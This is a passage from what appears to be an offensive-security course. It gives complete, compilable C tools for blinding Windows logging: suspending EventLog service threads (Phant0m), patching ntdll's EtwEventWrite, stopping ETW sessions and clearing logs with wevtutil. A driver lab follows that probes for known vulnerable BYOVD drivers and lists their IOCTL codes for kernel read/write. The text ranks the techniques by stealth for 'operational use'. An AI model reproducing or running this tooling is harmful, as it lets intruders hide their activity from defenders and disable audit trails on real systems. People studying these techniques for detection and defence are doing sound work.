    printf("  Instead of stopping the service (noisy), suspend its threads\n");
    printf("  Result: EventLog stops writing, but no service stop event\n\n");

    printf("IMPLEMENTATION:\n\n");

    // Step 1: Find EventLog service PID
    printf("[1] Find EventLog service PID:\n");
    FILE* f = _popen("sc queryex EventLog | findstr PID", "r");
    char pidLine[256] = {0};
    DWORD eventLogPid = 0;

    if (f) {
        if (fgets(pidLine, sizeof(pidLine), f)) {
            printf("    %s", pidLine);
            // Parse PID from output
            char* pidStr = strstr(pidLine, ":");
            if (pidStr) {
                eventLogPid = atoi(pidStr + 1);
                printf("    [+] EventLog PID: %lu\n", eventLogPid);
            }
        }
        _pclose(f);
    }

    if (eventLogPid == 0) {
        printf("    [-] Failed to find EventLog PID\n");
        return FALSE;
    }

    // Step 2: Enumerate and suspend threads
    printf("\n[2] Enumerate threads in EventLog svchost process:\n");

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("    [-] Failed to create thread snapshot\n");
        return FALSE;
    }

    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    // Collect thread IDs
    DWORD threadIds[64] = {0};
    int threadCount = 0;

    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == eventLogPid && threadCount < 64) {
                threadIds[threadCount++] = te32.th32ThreadID;
            }
        } while (Thread32Next(hSnapshot, &te32));
    }

    CloseHandle(hSnapshot);
    printf("    [+] Found %d threads in EventLog process\n", threadCount);

    if (threadCount == 0) {
        printf("    [-] No threads found\n");
        return FALSE;
    }

    // Step 3: Suspend threads
    printf("\n[3] Suspending EventLog threads:\n");
    printf("    [!] WARNING: This will stop event logging!\n");
    printf("    [*] Suspending threads for 5 seconds...\n\n");

    HANDLE suspendedThreads[64] = {0};
    int suspendedCount = 0;

    for (int i = 0; i < threadCount; i++) {
        HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, threadIds[i]);
        if (hThread) {
            DWORD result = SuspendThread(hThread);
            if (result != (DWORD)-1) {
                printf("    [+] Suspended thread %lu (suspend count: %lu)\n", threadIds[i], result + 1);
                suspendedThreads[suspendedCount++] = hThread;
            } else {
                printf("    [-] Failed to suspend thread %lu (error: %lu)\n", threadIds[i], GetLastError());
                CloseHandle(hThread);
            }
        } else {
            printf("    [-] Failed to open thread %lu (error: %lu)\n", threadIds[i], GetLastError());
        }
    }

    if (suspendedCount == 0) {
        printf("\n    [-] Failed to suspend any threads (requires admin/SYSTEM)\n");
        return FALSE;
    }

    printf("\n    [+] Successfully suspended %d threads!\n", suspendedCount);
    printf("    [+] EventLog service is now frozen\n");
    printf("    [+] No events will be written during this time\n\n");

    // Generate some test events that should NOT be logged
    printf("[4] Testing: EventLog is suspended (frozen):\n");
    printf("    [*] EventLog service cannot process any requests\n");
    printf("    [*] Any events generated now will be queued or lost\n");
    printf("    [*] Commands that interact with EventLog will hang\n");
    printf("    [+] This proves the suspension is working!\n\n");

    printf("    [*] Waiting 5 seconds while EventLog is frozen...\n");
    Sleep(5000);

    // Step 4: Resume threads
    printf("\n[5] Resuming EventLog threads:\n");

    for (int i = 0; i < suspendedCount; i++) {
        // Resume multiple times to ensure thread is fully resumed
        DWORD suspendCount;
        do {
            suspendCount = ResumeThread(suspendedThreads[i]);
            if (suspendCount != (DWORD)-1 && suspendCount > 0) {
                printf("    [+] Resumed thread (suspend count now: %lu)\n", suspendCount - 1);
            }
        } while (suspendCount > 1); // Keep resuming until suspend count is 0

        CloseHandle(suspendedThreads[i]);
    }

    printf("\n    [+] All threads fully resumed\n");
    printf("    [+] EventLog service is now operational again\n\n");

    // Give EventLog a moment to recover
    Sleep(1000);

    // Now test that EventLog is working again
    printf("[6] Verification - EventLog is working again:\n");
    printf("    [*] Creating test event now that service is resumed...\n");

    // Use a timeout for the command in case it still hangs
    printf("    [*] Testing with timeout (10 seconds)...\n");
    int result = system("timeout /t 2 /nobreak >nul 2>&1 & eventcreate /T INFORMATION /ID 1000 /L APPLICATION /D \"Test after resume\" >nul 2>&1");
    if (result == 0) {
        printf("    [+] Test event created successfully\n");
        printf("    [+] EventLog service is operational\n");
    } else {
        printf("    [!] Test event creation timed out or failed\n");
        printf("    [!] EventLog may still be recovering\n");
    }

    printf("\n    Check Event Viewer:\n");
    printf("      - Look for gap in logs during suspension period\n");
    printf("      - Test event (ID 1000) should appear AFTER resume\n");
    printf("      - Events during suspension should be missing\n\n");

    printf("DETECTION:\n");
    printf("  - Suspended threads visible in Process Explorer during suspension\n");
    printf("  - Gap in event logs (missing events during suspension period)\n");
    printf("  - EDR may detect SuspendThread API calls\n");
    printf("  - No service stop event generated (stealthier than stopping service)\n\n");

    printf("REFERENCE:\n");
    printf("  Phant0m: https://github.com/hlldz/Phant0m\n");
    printf("  Full implementation with thread start address checking\n");

    return TRUE;
}

// Demonstrate event log clearing (noisy baseline)
BOOL DemonstrateLogClearing() {
    printf("\n=== Event Log Clearing (Baseline - NOISY) ===\n\n");

    printf("TRADITIONAL APPROACH:\n");
    printf("  wevtutil cl Security\n");
    printf("  wevtutil cl System\n");
    printf("  Clear-EventLog -LogName Security\n\n");

    printf("PROBLEM:\n");
    printf("  Generates Event ID 1102: \"The audit log was cleared\"\n");
    printf("  Recorded in Security log (if not cleared first)\n");
    printf("  Obvious indicator of compromise\n");
    printf("  SIEM/EDR will alert immediately\n\n");

    printf("DEMONSTRATION:\n");
    printf("  Creating test event log for clearing demo...\n");

    // Create a custom event log for testing
    system("wevtutil im test_manifest.xml >nul 2>&1");

    printf("  [*] Attempting to clear Application log (less critical)...\n");
    printf("      (This will generate Event ID 1102 in Security log)\n\n");

    // Count events before clearing
    FILE* f = _popen("wevtutil qe Application /c:1 /rd:true /f:text 2>nul | findstr \"Event\"", "r");
    if (f) {
        char line[256];
        if (fgets(line, sizeof(line), f)) {
            printf("  [+] Application log has events\n");
        }
        _pclose(f);
    }

    printf("  [*] Clearing Application log...\n");
    int result = system("wevtutil cl Application >nul 2>&1");

    if (result == 0) {
        printf("  [+] Application log cleared\n");
        printf("  [!] Event ID 1102 generated in Security log\n");
        printf("  [!] This is HIGHLY suspicious and will trigger alerts\n\n");

        // Check for 1102 event
        printf("  [*] Checking for Event ID 1102 in Security log...\n");
        system("wevtutil qe Security /q:\"*[System[(EventID=1102)]]\" /c:1 /rd:true /f:text 2>nul");
    } else {
        printf("  [-] Failed to clear log (requires admin)\n");
    }

    printf("\nCONCLUSION:\n");
    printf("  Log clearing is too noisy for stealth operations\n");
    printf("  Use ETW session tampering or thread suspension instead\n");

    return TRUE;
}

int main() {
    printf("===========================================\n");
    printf("ETW Session Tampering & Event Log Evasion\n");
    printf("===========================================\n");

    printf("\nPRIVILEGE REQUIREMENTS:\n");
    printf("  - Admin required for session manipulation\n");
    printf("  - SYSTEM may be required for some techniques\n\n");

    // Enumerate sessions
    EnumerateETWSessions();

    // Demonstrate session tampering
    DemonstrateSessionTampering();

    // Demonstrate Phant0m technique
    DemonstratePhant0mTechnique();

    // Show why log clearing is bad
    DemonstrateLogClearing();

    printf("\n===========================================\n");
    printf("SUMMARY:\n");
    printf("  [+] ETW sessions enumerated\n");
    printf("  [+] Session tampering techniques demonstrated\n");
    printf("  [+] Phant0m thread suspension explained\n");
    printf("  [!] Log clearing is noisy - avoid it\n");
    printf("\n");
    printf("SESSION PROTECTIONS:\n");
    printf("  EventLog sessions are now hardened against tampering:\n");
    printf("    - Buffer size changes blocked (parameter validation)\n");
    printf("    - Session updates require special privileges\n");
    printf("    - Microsoft hardened these after red team abuse\n");
    printf("\n");
    printf("BEST TECHNIQUES (in order of stealth):\n");
    printf("  1. Thread suspension (Phant0m) - still works\n");
    printf("  2. Custom/EDR session tampering (less protected)\n");
    printf("  3. Provider disabling (moderate detection risk)\n");
    printf("  4. Session stopping (high detection risk)\n");
    printf("  5. Log clearing (VERY noisy - avoid)\n");
    printf("\n");
    printf("KEY INSIGHT:\n");
    printf("  The act of tampering generates telemetry.\n");
    printf("  Best approach: Prevent events from being written\n");
    printf("  rather than deleting them after the fact.\n");
    printf("\n");
    printf("PRACTICAL APPROACH:\n");
    printf("  - EventLog sessions: Use Phant0m (thread suspension)\n");
    printf("  - EDR sessions: May be less protected, try tampering\n");
    printf("  - Custom sessions: Usually unprotected\n");
    printf("  - Always test in lab before operational use\n");
    printf("===========================================\n");

    return 0;
}
```

```bash
cl src\etw_session_tamper.c /Fe:bin\etw_session_tamper.exe advapi32.lib
# Run as admin
.\bin\etw_session_tamper.exe
```

#### Technique 4: Building an ETW Blinding Tool

```c
// etw_blinder.c - Comprehensive ETW blinding demonstration
// Compile: cl src\etw_blinder.c /Fe:bin\etw_blinder.exe advapi32.lib ntdll.lib psapi.lib

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <evntrace.h>
#include <evntprov.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "psapi.lib")

typedef NTSTATUS(NTAPI* pNtQueryInformationThread)(
    HANDLE ThreadHandle,
    ULONG ThreadInformationClass,
    PVOID ThreadInformation,
    ULONG ThreadInformationLength,
    PULONG ReturnLength
);

// Test provider for verification
static const GUID TestProviderGuid =
    { 0x12345678, 0x1234, 0x1234, { 0x12, 0x34, 0x12, 0x34, 0x56, 0x78, 0x90, 0x12 } };

// ---- MODULE 1: EtwEventWrite Patch with Verification ----

BOOL PatchEtwFunction(const char* funcName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pFunc = GetProcAddress(hNtdll, funcName);
    if (!pFunc) return FALSE;

    BYTE patch[] = { 0x48, 0x33, 0xC0, 0xC3 }; // xor rax, rax; ret

    DWORD oldProtect;
    if (!VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    memcpy(pFunc, patch, sizeof(patch));
    VirtualProtect(pFunc, sizeof(patch), oldProtect, &oldProtect);

    // Verify
    BYTE verify[4];
    memcpy(verify, pFunc, 4);
    return (memcmp(verify, patch, 4) == 0);
}

BOOL BlindETW_PatchEventWrite() {
    printf("\n=== MODULE 1: Patch EtwEventWrite ===\n\n");
    printf("[*] Patching ntdll!EtwEventWrite functions...\n");

    BOOL success = TRUE;

    if (PatchEtwFunction("EtwEventWrite")) {
        printf("[+] EtwEventWrite patched\n");
    } else {
        printf("[-] EtwEventWrite patch failed\n");
        success = FALSE;
    }

    if (PatchEtwFunction("EtwEventWriteEx")) {
        printf("[+] EtwEventWriteEx patched\n");
    }

    if (PatchEtwFunction("EtwEventWriteFull")) {
        printf("[+] EtwEventWriteFull patched\n");
    }

    // Verify with test provider
    printf("\n[*] Verifying patch...\n");

    REGHANDLE hProvider = 0;
    ULONG result = EventRegister(&TestProviderGuid, NULL, NULL, &hProvider);
    if (result == ERROR_SUCCESS) {
        EVENT_DESCRIPTOR eventDesc = {0};
        eventDesc.Id = 1;
        eventDesc.Level = TRACE_LEVEL_INFORMATION;

        result = EventWrite(hProvider, &eventDesc, 0, NULL);
        printf("[+] EventWrite returned: %lu (suppressed!)\n", result);
        printf("[+] Verification: ETW patching works!\n");

        EventUnregister(hProvider);
    }

    return success;
}

// ---- MODULE 2: Phant0m Thread Suspension ----

BOOL BlindETW_Phant0m() {
    printf("\n=== MODULE 2: Phant0m Thread Suspension ===\n\n");

    // Find EventLog service PID
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) {
        printf("[-] OpenSCManager failed: %lu\n", GetLastError());
        return FALSE;
    }

    SC_HANDLE hSvc = OpenServiceA(hSCM, "EventLog", SERVICE_QUERY_STATUS);
    if (!hSvc) {
        printf("[-] OpenService failed: %lu\n", GetLastError());
        CloseServiceHandle(hSCM);
        return FALSE;
    }

    SERVICE_STATUS_PROCESS ssp = {0};
    DWORD needed = 0;
    if (!QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &needed)) {
        printf("[-] QueryServiceStatusEx failed: %lu\n", GetLastError());
        CloseServiceHandle(hSvc);
        CloseServiceHandle(hSCM);
        return FALSE;
    }

    DWORD targetPid = ssp.dwProcessId;
    printf("[+] EventLog PID: %lu\n", targetPid);

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);

    // Find wevtsvc.dll range
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, targetPid);
    if (!hProcess) {
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
        return FALSE;
    }

    HMODULE hMods[1024];
    DWORD cbNeeded = 0;
    MODULEINFO wevtInfo = {0};
    BOOL foundWevt = FALSE;

    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        DWORD numModules = cbNeeded / sizeof(HMODULE);
        for (DWORD i = 0; i < numModules; i++) {
            char modName[MAX_PATH];
            if (GetModuleBaseNameA(hProcess, hMods[i], modName, sizeof(modName))) {
                if (_stricmp(modName, "wevtsvc.dll") == 0) {
                    GetModuleInformation(hProcess, hMods[i], &wevtInfo, sizeof(wevtInfo));
                    foundWevt = TRUE;
                    printf("[+] wevtsvc.dll: 0x%p (size: %lu)\n", wevtInfo.lpBaseOfDll, wevtInfo.SizeOfImage);
                    break;
                }
            }
        }
    }

    CloseHandle(hProcess);

    if (!foundWevt) {
        printf("[-] wevtsvc.dll not found\n");
        return FALSE;
    }

    ULONG_PTR wevtBase = (ULONG_PTR)wevtInfo.lpBaseOfDll;
    ULONG_PTR wevtEnd = wevtBase + wevtInfo.SizeOfImage;

    // Get NtQueryInformationThread
    pNtQueryInformationThread NtQueryInfoThread =
        (pNtQueryInformationThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread");
    if (!NtQueryInfoThread) {
        printf("[-] Cannot resolve NtQueryInformationThread\n");
        return FALSE;
    }

    // Enumerate and suspend threads
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        printf("[-] CreateToolhelp32Snapshot failed\n");
        return FALSE;
    }

    THREADENTRY32 te = { .dwSize = sizeof(THREADENTRY32) };
    int suspendedThreads = 0;

    printf("\n[*] Suspending wevtsvc.dll threads...\n");

    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID != targetPid) continue;

            HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION | THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
            if (!hThread) continue;

            PVOID startAddress = NULL;
            NTSTATUS status = NtQueryInfoThread(hThread, 9, &startAddress, sizeof(startAddress), NULL);

            if (status == 0 && startAddress != NULL) {
                ULONG_PTR addr = (ULONG_PTR)startAddress;
                if (addr >= wevtBase && addr < wevtEnd) {
                    DWORD suspCount = SuspendThread(hThread);
                    if (suspCount != (DWORD)-1) {
                        printf("[+] Suspended TID %lu (start: 0x%p)\n", te.th32ThreadID, startAddress);
                        suspendedThreads++;
                    }
                }
            }

            CloseHandle(hThread);
        } while (Thread32Next(hSnap, &te));
    }

    CloseHandle(hSnap);

    printf("\n[+] Suspended %d wevtsvc.dll threads\n", suspendedThreads);

    if (suspendedThreads > 0) {
        printf("[+] EventLog FROZEN - testing for 3 seconds...\n");
        Sleep(3000);

        // Resume threads
        printf("[*] Resuming threads...\n");
        hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            te.dwSize = sizeof(THREADENTRY32);
            if (Thread32First(hSnap, &te)) {
                do {
                    if (te.th32OwnerProcessID != targetPid) continue;
                    HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                    if (hThread) {
                        DWORD suspCount;
                        do {
                            suspCount = ResumeThread(hThread);
                        } while (suspCount > 1);
                        CloseHandle(hThread);
                    }
                } while (Thread32Next(hSnap, &te));
            }
            CloseHandle(hSnap);
        }
        printf("[+] Threads resumed\n");
        return TRUE;
    }

    return FALSE;
}

// ---- MODULE 3: ETW Session Manipulation ----

#define PROPERTIES_BUFFER_SIZE (sizeof(EVENT_TRACE_PROPERTIES) + 1024)

BOOL BlindETW_DisableSession(const char* sessionName) {
    printf("\n[*] Targeting session: %s\n", sessionName);

    BYTE buffer[PROPERTIES_BUFFER_SIZE] = {0};
    EVENT_TRACE_PROPERTIES* props = (EVENT_TRACE_PROPERTIES*)buffer;

    props->Wnode.BufferSize = PROPERTIES_BUFFER_SIZE;
    props->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
    props->LogFileNameOffset = sizeof(EVENT_TRACE_PROPERTIES) + 512;

    // Query session
    ULONG status = ControlTraceA(0, sessionName, props, EVENT_TRACE_CONTROL_QUERY);

    if (status == ERROR_WMI_INSTANCE_NOT_FOUND) {
        printf("[-] Session does not exist\n");
        return FALSE;
    }

    if (status != ERROR_SUCCESS) {
        printf("[-] Cannot query: %lu\n", status);
        return FALSE;
    }

    printf("[+] Session found (BufferSize: %lu KB)\n", props->BufferSize);

    // Try to stop
    memset(buffer, 0, sizeof(buffer));
    props->Wnode.BufferSize = PROPERTIES_BUFFER_SIZE;
    props->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
    props->LogFileNameOffset = sizeof(EVENT_TRACE_PROPERTIES) + 512;

    status = ControlTraceA(0, sessionName, props, EVENT_TRACE_CONTROL_STOP);

    if (status == ERROR_SUCCESS) {
        printf("[+] Session STOPPED\n");
        return TRUE;
    } else {
        printf("[-] Stop failed: %lu (protected)\n", status);
    }

    return FALSE;
}

// ---- MAIN ----

int main() {
    printf("===========================================\n");
    printf("  ETW Blinding Tool - Full Implementation\n");
    printf("===========================================\n");

    // Module 1: Patch ETW
    BlindETW_PatchEventWrite();

    // Module 2: Phant0m
    BlindETW_Phant0m();

    // Module 3: Session manipulation
    printf("\n=== MODULE 3: Session Manipulation ===\n");
    BlindETW_DisableSession("DiagLog");
    BlindETW_DisableSession("DiagTrack-Listener");

    printf("\n===========================================\n");
    printf("RESULTS:\n");
    printf("  + EtwEventWrite patched and verified\n");
    printf("  + Phant0m thread suspension demonstrated\n");
    printf("  + Session manipulation attempted\n");
    printf("\n");
    printf("EFFECTIVENESS:\n");
    printf("  - Usermode ETW: SUPPRESSED\n");
    printf("  - EventLog: FROZEN (3 sec test)\n");
    printf("  - Protected sessions: BLOCKED (expected)\n");
    printf("\n");
    printf("REALITY:\n");
    printf("  - Usermode patching: Still works\n");
    printf("  - Phant0m: Still effective\n");
    printf("  - Session tampering: Increasingly protected\n");
    printf("  - Kernel TI ETW: Requires kernel access\n");
    printf("===========================================\n");

    return 0;
}
```

```bash
cl src\etw_blinder.c /Fe:bin\etw_blinder.exe advapi32.lib ntdll.lib psapi.lib
# run as admin
.\bin\etw_blinder.exe
```

### Driver IOCTL Lab - Kernel Communication Fundamentals

```c
// driver_ioctl_lab.c - Enumerate kernel drivers, decode IOCTLs, and
//                      communicate with real drivers on the live system
// Compile: cl src\driver_ioctl_lab.c /Fe:bin\driver_ioctl_lab.exe advapi32.lib setupapi.lib

#include <windows.h>
#include <setupapi.h>
#include <stdio.h>
#include <winternl.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "setupapi.lib")

/*
IOCTL CODE STRUCTURE (32-bit value):
┌──────────┬────────┬──────────────┬──────────────┐
│ DevType  │ Access │ Function     │ Method       │
│ [31:16]  │[15:14] │ [13:2]       │ [1:0]        │
└──────────┴────────┴──────────────┴──────────────┘
CTL_CODE(DeviceType, Function, Method, Access)

METHOD_BUFFERED(0):  Kernel copies data (safest)
METHOD_IN_DIRECT(1): MDL for input
METHOD_OUT_DIRECT(2): MDL for output
METHOD_NEITHER(3):   Raw user pointer (DANGEROUS - double-fetch, UAF)
*/

// ── IOCTL code decoder ──────────────────────────────────────

void DecodeIOCTL(DWORD ioctl) {
    DWORD deviceType = (ioctl >> 16) & 0xFFFF;
    DWORD access     = (ioctl >> 14) & 0x3;
    DWORD function   = (ioctl >> 2)  & 0xFFF;
    DWORD method     = ioctl & 0x3;

    const char* methodName[] = {
        "BUFFERED", "IN_DIRECT", "OUT_DIRECT", "NEITHER"
    };
    const char* accessName[] = {
        "ANY_ACCESS", "READ_ACCESS", "WRITE_ACCESS", "READ|WRITE"
    };

    printf("  IOCTL 0x%08X decoded:\n", ioctl);
    printf("    DeviceType: 0x%04X", deviceType);
    if (deviceType == 0x22) printf(" (FILE_DEVICE_UNKNOWN)");
    else if (deviceType == 0x09) printf(" (FILE_DEVICE_DISK)");
    else if (deviceType == 0x8000) printf(" (CUSTOM)");
    printf("\n");
    printf("    Function:   0x%03X (%d)\n", function, function);
    printf("    Method:     %s (%d)\n", methodName[method], method);
    printf("    Access:     %s (%d)\n", accessName[access], access);

    if (method == 3) {
        printf("    [!] METHOD_NEITHER - user buffers passed directly!\n");
        printf("        Attack surface: double-fetch, UAF, address confusion\n");
    }
}

// ── Enumerate loaded kernel drivers ─────────────────────────

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    CHAR FullPathName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    SYSTEM_MODULE_INFORMATION_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION;

typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

void EnumerateLoadedDrivers() {
    printf("\n=== Loaded Kernel Drivers ===\n\n");

    NtQuerySystemInformation_t NtQSI =
        (NtQuerySystemInformation_t)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    if (!NtQSI) {
        printf("[-] Cannot resolve NtQuerySystemInformation\n");
        return;
    }

    // SystemModuleInformation = 11
    ULONG needed = 0;
    NtQSI(11, NULL, 0, &needed);

    if (needed == 0) {
        printf("[-] Cannot query buffer size\n");
        return;
    }

    SYSTEM_MODULE_INFORMATION* modules = (SYSTEM_MODULE_INFORMATION*)malloc(needed);
    if (!modules) {
        printf("[-] Memory allocation failed\n");
        return;
    }

    NTSTATUS status = NtQSI(11, modules, needed, &needed);

    if (status != 0) {
        printf("[-] NtQuerySystemInformation failed: 0x%lX\n", status);
        printf("    (May require Medium IL or higher)\n");
        free(modules);
        return;
    }

    printf("[+] Loaded kernel modules: %lu\n\n", modules->Count);
    printf("  %-18s %-10s %s\n", "Base", "Size", "Driver");
    printf("  %-18s %-10s %s\n", "----------------", "--------", "-------");

    // Show first few plus any interesting ones
    int shown = 0;
    for (ULONG i = 0; i < modules->Count && shown < 30; i++) {
        char* name = modules->Modules[i].FullPathName +
                     modules->Modules[i].OffsetToFileName;

        // Flag known BYOVD targets
        BOOL isByovd = (
            _stricmp(name, "RTCore64.sys") == 0 ||
            _stricmp(name, "dbutil_2_3.sys") == 0 ||
            _stricmp(name, "BdApiUtil64.sys") == 0 ||
            _stricmp(name, "gdrv.sys") == 0 ||
            _stricmp(name, "asio.sys") == 0 ||
            _stricmp(name, "PROCEXP152.sys") == 0 ||
            _stricmp(name, "ProcExp64a.sys") == 0 ||
            _stricmp(name, "ene.sys") == 0
        );

        // Show ntoskrnl, hal, and any BYOVD candidates
        if (i < 5 || isByovd ||
            strstr(name, "driver") || strstr(name, "Drv")) {
            printf("  %s0x%016p %-10lu %s%s\n",
                   isByovd ? "[!] " : "    ",
                   modules->Modules[i].ImageBase,
                   modules->Modules[i].ImageSize,
                   name,
                   isByovd ? " <-- KNOWN BYOVD TARGET" : "");
            shown++;
        }
    }

    printf("\n[+] Showing %d of %lu modules\n", shown, modules->Count);
    free(modules);
}

// ── Probe known BYOVD driver device paths ───────────────────

void ProbeBYOVDDrivers() {
    printf("\n=== BYOVD Driver Device Probe ===\n\n");

    struct {
        const wchar_t* path;
        const char* name;
        const char* cve;
        DWORD readIoctl;
        DWORD writeIoctl;
    } drivers[] = {
        { L"\\\\.\\RTCore64",
          "MSI RTCore64.sys", "CVE-2019-18845",
          0x80002048, 0x8000204C },
        { L"\\\\.\\DBUtil_2_3",
          "Dell dbutil_2_3.sys", "CVE-2021-21551",
          0x9B0C1EC4, 0x9B0C1EC8 },
        { L"\\\\.\\BdApiUtil64",
          "Bitdefender BdApiUtil64.sys", "N/A",
          0x80002048, 0x8000204C },
        { L"\\\\.\\GIO",
          "GIGABYTE GDrv/GIO.sys", "N/A",
          0xC3502004, 0xC3502008 },
        { L"\\\\.\\PROCEXP152",
          "Process Explorer", "N/A (by design)",
          0x8335003C, 0 },
        { L"\\\\.\\Nal",
          "Intel NAL (iqvw64e.sys)", "CVE-2015-2291",
          0x80862007, 0 },
        { L"\\\\.\\ZemanaAntiMalware",
          "Zemana AM driver", "CVE-2021-31728",
          0x80002048, 0 },
    };

    int foundCount = 0;

    for (int i = 0; i < sizeof(drivers)/sizeof(drivers[0]); i++) {
        HANDLE h = CreateFileW(
            drivers[i].path,
            GENERIC_READ | GENERIC_WRITE,
            0, NULL, OPEN_EXISTING, 0, NULL
        );

        if (h != INVALID_HANDLE_VALUE) {
            printf("[+] %-35s ACCESSIBLE!\n", drivers[i].name);
            printf("    Device: %ls\n", drivers[i].path);
            printf("    CVE: %s\n", drivers[i].cve);
            printf("    Read IOCTL:  0x%08X\n", drivers[i].readIoctl);
            if (drivers[i].writeIoctl) {
                printf("    Write IOCTL: 0x%08X\n", drivers[i].writeIoctl);
            }
            printf("    [!] KERNEL R/W PRIMITIVE AVAILABLE\n\n");
            CloseHandle(h);
            foundCount++;
        } else {
            DWORD err = GetLastError();
            if (err != ERROR_FILE_NOT_FOUND && err != ERROR_PATH_NOT_FOUND) {
                printf("[-] %-35s Error: %lu\n", drivers[i].name, err);
            }
        }
    }

    if (foundCount == 0) {
        printf("[*] No BYOVD drivers found (this is normal on clean systems)\n");
    } else {
        printf("[!] Found %d accessible BYOVD driver(s)!\n", foundCount);
    }
}

// ── Send test IOCTL to a target driver ──────────────────────

// RTCore64 memory structure - MUST be 48 bytes!
typedef struct _RTCORE64_MEMORY {
    BYTE  Pad0[8];      // 8 bytes padding
    DWORD64 Address;    // 8 bytes - target address
    BYTE  Pad1[8];      // 8 bytes padding
    DWORD ReadSize;     // 4 bytes - size to read (1, 2, or 4)
    DWORD Value;        // 4 bytes - value read/write
    BYTE  Pad2[16];     // 16 bytes padding
} RTCORE64_MEMORY;

void SendTestIOCTL(const wchar_t* devicePath, DWORD ioctlCode,
                   void* inBuf, DWORD inSize) {
    printf("\n=== Sending IOCTL to %ls ===\n\n", devicePath);

    HANDLE hDevice = CreateFileW(
        devicePath,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open device: %lu\n", GetLastError());
        return;
    }

    printf("[+] Device opened: 0x%p\n", hDevice);
    printf("[*] Sending IOCTL 0x%08X...\n\n", ioctlCode);

    DecodeIOCTL(ioctlCode);

    BYTE outBuf[4096] = {0};
    DWORD bytesReturned = 0;
    BOOL ok;

    // Special handling for RTCore64 read IOCTL
    if (ioctlCode == 0x80002048 && _wcsicmp(devicePath, L"\\\\.\\RTCore64") == 0) {
        printf("\n[*] RTCore64 read detected - using proper 48-byte structure\n");

        RTCORE64_MEMORY mem = {0};
        mem.Address = 0xFFFFF80000000000ULL;  // Typical kernel base
        mem.ReadSize = 4;

        printf("[*] Structure prepared:\n");
        printf("    Address: 0x%llX\n", mem.Address);
        printf("    ReadSize: %lu bytes\n", mem.ReadSize);
        printf("    Structure size: %zu bytes (must be 48)\n", sizeof(mem));

        printf("\n[!] WARNING: Reading arbitrary kernel memory can crash the system!\n");
        printf("[!] This is a demonstration of the correct structure.\n");
        printf("[!] In real usage, you need a valid kernel address (e.g., from leaked ntoskrnl base)\n");
        printf("\n[*] Skipping actual IOCTL call to prevent crash.\n");
        printf("[*] To actually use this:\n");
        printf("    1. Leak kernel base address first\n");
        printf("    2. Calculate valid address (e.g., ntoskrnl!MmGetPhysicalAddress)\n");
        printf("    3. Then send IOCTL with that address\n");

        // Don't actually send the IOCTL - just show the structure
        printf("\n[+] Structure demonstration complete\n");
        printf("[+] See ppl_bypass_rtcore.c for full working example\n");
    } else {
        // Generic IOCTL handling
        ok = DeviceIoControl(
            hDevice, ioctlCode,
            inBuf, inSize,
            outBuf, sizeof(outBuf),
            &bytesReturned, NULL
        );

        if (ok) {
            printf("\n[+] IOCTL succeeded! Returned %lu bytes\n", bytesReturned);
            if (bytesReturned > 0 && bytesReturned <= 64) {
                printf("[*] Output: ");
                for (DWORD i = 0; i < bytesReturned; i++)
                    printf("%02X ", outBuf[i]);
                printf("\n");
            }
        } else {
            DWORD err = GetLastError();
            printf("\n[-] IOCTL failed: %lu", err);
            if (err == 1) printf(" (ERROR_INVALID_FUNCTION)");
            else if (err == 87) printf(" (ERROR_INVALID_PARAMETER)");
            else if (err == 5) printf(" (ERROR_ACCESS_DENIED)");
            printf("\n");
        }
    }

    CloseHandle(hDevice);
}

// ── Enumerate driver service entries from registry ──────────

void EnumerateDriverServices() {
    printf("\n=== Third-Party Driver Services (from Registry) ===\n\n");

    HKEY hKey;
    LONG ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Services",
